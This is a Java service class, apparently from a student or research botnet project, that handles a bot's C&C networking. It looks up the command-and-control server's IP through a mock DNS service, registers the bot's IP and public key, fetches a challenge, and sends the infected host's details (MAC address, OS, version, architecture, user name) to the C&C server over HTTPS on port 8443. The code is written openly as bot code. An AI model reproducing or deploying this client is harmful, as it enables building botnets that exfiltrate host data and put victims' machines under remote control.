package cs.sii.service.connection;

import com.google.common.reflect.TypeToken;

import cs.sii.domain.Conversions;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import javassist.compiler.ast.Pair;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.AsyncResult;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import javax.annotation.PostConstruct;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Type;
import java.security.PublicKey;
import java.security.spec.EncodedKeySpec;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Future;

@Service("AsyncRequest")
public class AsyncRequest {

	private static final int WAIT_RANGE = 250;

	private static final String PORT = ":8443";

	private static final String HTTPS = "https://";
	private static final String HTTP = "http://";

	public final static Integer REQNUMBER = 6;

	private static final int TIMEOUT_MILLIS = 600000;

	private RestTemplate restTemplate = new RestTemplate();

	private Integer timeoutSeconds;

	public AsyncRequest() {
		// restTemplate=new RestTemplate()

		// loadConfiguration();
	}

	// Da cambiare
	@Async
	public Future<String> pingUser(String uriMiner) {

		// SimpleClientHttpRequestFactory rf = ((SimpleClientHttpRequestFactory)
		// restTemplate.getRequestFactory());
		// rf.setReadTimeout(1000 * 5);
		// rf.setConnectTimeout(1000 * 5);
		// restTemplate.setRequestFactory(rf);

		Integer counter = 0;
		while (counter <= REQNUMBER) {
			try {
				System.out.println("\nRichiesta ad :" + uriMiner);
				// String response = restTemplate.postForObject("http://" +
				// uriMiner + "/user_ping", null, String.class);
				String response = doPost(HTTPS + uriMiner + "/user_ping", "");
				return new AsyncResult<>(response);
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("\nSono Morto: " + uriMiner + " Causa: " + e.getMessage());
				counter++;

				// Aspetto prima della prossima richiesta
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + ex);
					ex.printStackTrace();
				}
			}
		}
		return null;
	}

	// da valutare se devono essere asincroni
	public Pairs<IP, String> getIpCeCFromDnsServer(String dnsUrl) {
		Pairs<IP, String> cec = new Pairs<>();
		Type type = new TypeToken<Pairs<IP, String>>() {
		}.getType();
		while (true) {
			try {
				System.out.println("url request " + dnsUrl);
				String url = HTTP + dnsUrl;
				cec = doGetJSON(HTTP + dnsUrl, type);
				return cec;
				// cec=restTemplate.getForEntity
				// cecBase64.decodeBase64(cec.getValue2());

			} catch (Exception e) {
				System.err.println("Errore ricezione Ip da Mock Dns Server" + e);
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					System.err.println("Errore sleep" + e);
					ex.printStackTrace();
				}
			}
		}
	}

	// da valutare se devono essere asincroni
	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, IP ipCeC) {

		Pairs<Long, Integer> response = new Pairs<>();
		Integer counter = 0;
		while (true) {
			// Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
			// String postRequest = "{\"idBot\":\""+idBot+"\"}";
			try {
				String url = HTTPS + ipCeC + PORT + "/welcome";
				System.out.println("url challenge request " + url);
				response = restTemplate.postForObject(url, idBot, response.getClass());
				// System.out.println("Url:"+url);
				// challenge=doGetJSON(url, type);
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				counter++;
				System.out.println("Errore ricezione Challenge");
				try {
					Thread.sleep(WAIT_RANGE);// TODO cambiare il tempo e
												// prenderlo da
					// properties
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	// TODO aggiungere una nuova pairs<Pairs<IP,PK>, Signature>;
	// da valutare se devono essere asincroni
	public Boolean sendInfoToDnsServer(String dnsUrl, IP myIp, PublicKey myPublicKey) {
		Pairs<IP, String> data = new Pairs<>();
		data.setValue1(myIp);
		String str = Base64.encodeBase64String(myPublicKey.getEncoded());
		data.setValue2(str);
		Boolean response = false;
		while (true) {// while(!response)
			try {
				String url = HTTP + dnsUrl + "/alter";
				System.out.println("url " + url);
				response = restTemplate.postForObject(url, data, response.getClass());
				if (response != null)
					System.out.println(response);
				return response;
			} catch (Exception e) {
				System.out.println("Errore Aggiornamento DNS");
				try {
					Thread.sleep(WAIT_RANGE);// TODO cambiare il tempo e
												// prenderlo da
					// properties
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	// da valutare se devono essere asincroni
	/**
	 * @param idBot
	 *            botdata
	 * @param ip
	 *            botdata
	 * @param Mac
	 *            botdata
	 * @param os
	 *            botdata
	 * @param vers
	 *            botdata
	 * @param arch
	 *            botdata
	 * @param usrName
	 *            botdata
	 * @param dest
	 *            destinatio ip of request
	 * @param hashMac
	 *            mac to be verified
	 * @return
	 */
	public String getResponseFromCeC(String idBot, IP ip, String Mac, String os, String vers, String arch, String usrName, IP dest, String hashMac) {
		Integer counter = 0;
		String response = "";
		while (true) {// (counter <= REQNUMBER) {
			// Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
			// String postRequest = "{\"hashMac\":\""+hashMac+"\"}";
			try {
				// response = doPost("http://"+ip+":8080/welcome/hmac",
				// hashMac);
				// RestTemplate rest=new RestTemplate();

				List<Object> objects = new ArrayList<Object>();
				objects.add(idBot);
				objects.add(ip);
				objects.add(Mac);
				objects.add(os);
				objects.add(vers);
				objects.add(arch);
				objects.add(usrName);
				objects.add(hashMac);
				response = restTemplate.postForObject(HTTPS + dest + PORT + "/hmac", objects, String.class);
				System.out.println("Ok");
				return response;
			} catch (Exception e) {
				// e.printStackTrace();
				System.out.println("response:   " + response);
				System.out.println("Errore ricezione Challenge");
				counter++;

				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	public String askMyIpToAmazon() {

		String amazing = "http://checkip.amazonaws.com/";
		String response = "";
		while (true) {

			try {
				response = doGet(amazing);
				return response;
			} catch (Exception e) {
				System.out.println("no internet");
				try {
					Thread.sleep(WAIT_RANGE);
				} catch (InterruptedException ex) {
					ex.printStackTrace();
				}
				e.printStackTrace();
			}
		}
	}

	public static String doGet(String url) throws Exception {

		// HttpPost request = new HttpPost(url);

		HttpGet request = new HttpGet(url);

		RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
				.setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();

		request.setConfig(requestConfig);

		HttpClient client = HttpClientBuilder.create().build();

		HttpResponse response;
		response = client.execute(request);
		BufferedReader rd;
		rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		StringBuffer result = new StringBuffer();
		String line = "";
		while ((line = rd.readLine()) != null) {
			result.append(line);
		}
		return result.toString();
	}

	public static String doPost(String url, String raw_data) throws Exception {

		HttpClient client = HttpClientBuilder.create().build();
		HttpGet request = new HttpGet(url);
		HttpPost post = new HttpPost(url);
		// List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
		// for (Pairs<?, ?> p : parameters) {
		// urlParameters.add(new BasicNameValuePair(p.getValue1().toString(),
		// p.getValue2().toString()));
		// }

		RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
				.setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();

		request.setConfig(requestConfig);

		post.setEntity(new StringEntity(raw_data));
		HttpResponse response = client.execute(post);
		BufferedReader rd;
		rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		StringBuffer result = new StringBuffer();
		String line = "";
		while ((line = rd.readLine()) != null) {
			result.append(line);
		}
		return result.toString();
	}

	@SuppressWarnings("unchecked")
	public static <T> T doGetJSON(String url, Type t) throws IOException {

		HttpClient client = HttpClientBuilder.create().build();
		HttpGet request = new HttpGet(url);

		RequestConfig requestConfig = RequestConfig.custom().setSocketTimeout(TIMEOUT_MILLIS)
				.setConnectTimeout(TIMEOUT_MILLIS).setConnectionRequestTimeout(TIMEOUT_MILLIS).build();

		request.setConfig(requestConfig);

		HttpResponse response;
		response = client.execute(request);
		BufferedReader rd;
		rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		StringBuffer result = new StringBuffer();
		String line = "";
		while ((line = rd.readLine()) != null) {
			result.append(line);
		}

		return Conversions.fromJson(result.toString(), t);
	}

	public int getTimeoutSeconds() {
		return timeoutSeconds;
	}

	public void setTimeoutSeconds(int timeoutSeconds) {

		this.timeoutSeconds = timeoutSeconds;
	}
}
